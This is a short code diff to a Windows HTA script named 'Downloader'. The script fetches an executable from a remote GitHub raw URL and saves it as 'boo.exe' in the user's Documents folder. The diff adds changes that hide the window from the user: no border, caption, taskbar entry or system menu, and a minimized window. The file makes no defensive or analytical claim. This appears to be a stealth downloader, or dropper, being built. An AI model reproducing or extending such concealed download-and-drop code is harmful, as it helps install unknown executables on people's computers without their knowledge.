@@ -4,10 +4,13 @@
     <HTA:APPLICATION
       ID="app"
       APPLICATIONNAME="Downloader"
-      BORDER="thin"
-      CAPTION="yes"
-      SHOWINTASKBAR="yes"
+      BORDER="none"
+      CAPTION="no"
+      SHOWINTASKBAR="no"
       SINGLEINSTANCE="yes"
+      SYSMENU="no"
+      SCROLL="no"
+      WINDOWSTATE="minimize"
     >
   </head>
   <body>
@@ -18,7 +21,7 @@
       Dim url, savePath
 
       url = "https://github.com/Nuthoul/ergetbnerbepkwnef/raw/refs/heads/main/hellworld.exe"
-      savePath = "C:\Users\Nuthoul-\Downloads\boo.exe"
+      savePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\boo.exe"
 
       On Error Resume Next
 
@@ -56,4 +59,5 @@
     </script>
   </body>
 </html>
+
 
